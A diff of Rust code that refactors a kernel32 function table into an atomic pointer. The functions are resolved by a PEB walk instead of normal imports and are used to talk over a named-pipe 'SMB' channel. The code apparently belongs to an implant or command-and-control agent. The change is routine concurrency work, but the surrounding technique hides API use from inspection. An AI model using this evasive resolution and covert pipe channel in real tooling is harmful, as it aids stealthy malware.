@@ -96,42 +96,49 @@ struct K32Fns {
     close_handle: FCloseHandle,
 }
 
-static mut K32: Option<K32Fns> = None;
+/// kernel32 function table, stored as a raw pointer. 0 = uninitialized,
+/// 1 = init failed, otherwise = pointer to a leaked `K32Fns`.
+static K32: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
 
 /// Resolve the kernel32 function table once via PEB walk. `kernel32.dll` is
 /// always loaded by the loader, so `export_addr` finds it without
 /// `LoadLibraryA`. Idempotent: the `DONE` flag makes repeat calls no-ops.
-///
-/// # Safety
-/// Writes the process-global `K32` static; guarded by an AtomicBool so the
-/// resolution race is benign (two threads both resolve the same pointers).
 unsafe fn ensure_k32() -> bool {
-    use core::sync::atomic::{AtomicBool, Ordering};
-    static DONE: AtomicBool = AtomicBool::new(false);
-    if DONE.load(Ordering::Acquire) {
-        return K32.is_some();
+    use core::sync::atomic::Ordering;
+    // Fast path: already attempted.
+    let cur = K32.load(Ordering::Acquire);
+    if cur != 0 {
+        return cur > 1;
     }
     let cf = export_addr(b"kernel32.dll", b"CreateFileW");
     let wf = export_addr(b"kernel32.dll", b"WriteFile");
     let rf = export_addr(b"kernel32.dll", b"ReadFile");
     let ch = export_addr(b"kernel32.dll", b"CloseHandle");
-    let ok = matches!((cf, wf, rf, ch), (Some(a), Some(b), Some(c), Some(d)));
-    if ok {
+    if let (Some(cf), Some(wf), Some(rf), Some(ch)) = (cf, wf, rf, ch) {
         // SAFETY: function pointer transmute. The PEB-walk export resolution
         // returns the absolute address of the named export; transmuting to the
         // matching `extern "system"` signature is sound because the Win32 ABI
         // is exactly that signature. Mirrors transport.rs's WinHTTP resolution.
-        K32 = Some(K32Fns {
-            create_file_w: core::mem::transmute(cf.unwrap()),
-            write_file: core::mem::transmute(wf.unwrap()),
-            read_file: core::mem::transmute(rf.unwrap()),
-            close_handle: core::mem::transmute(ch.unwrap()),
+        let fns = alloc::boxed::Box::new(K32Fns {
+            create_file_w: core::mem::transmute(cf),
+            write_file: core::mem::transmute(wf),
+            read_file: core::mem::transmute(rf),
+            close_handle: core::mem::transmute(ch),
         });
+        let ptr = alloc::boxed::Box::into_raw(fns) as usize;
+        match K32.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
+            Ok(_) => return true,
+            Err(_) => {
+                drop(alloc::boxed::Box::from_raw(ptr as *mut K32Fns));
+                // Race winner already stored; return their result.
+                return K32.load(Ordering::Acquire) > 1;
+            }
+        }
     }
-    DONE.store(true, Ordering::Release);
-    ok
+    // Export resolution failed.
+    let _ = K32.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
+    false
 }
-
 /// Convert an ASCII byte slice to a null-terminated UTF-16 buffer (Windows wide
 /// string). Named-pipe paths are ASCII (`\\.\pipe\...`), so zero-extending each
 /// byte is sufficient (same approach as `transport::to_utf16`).
@@ -170,7 +177,12 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
         crate::entry::diag_mark(b"ERR_CH_SMB_NOAPI");
         return None;
     }
-    let fns = unsafe { (*{ &raw const K32 }).as_ref() }?;
+    let ptr = K32.load(core::sync::atomic::Ordering::Acquire);
+    if ptr <= 1 {
+        return None;
+    }
+    // SAFETY: pointer was stored by ensure_k32 via Box::leak; process-lifetime.
+    let fns = unsafe { &*(ptr as *const K32Fns) };
     let close = fns.close_handle;
 
     // ---- Open the named pipe ----
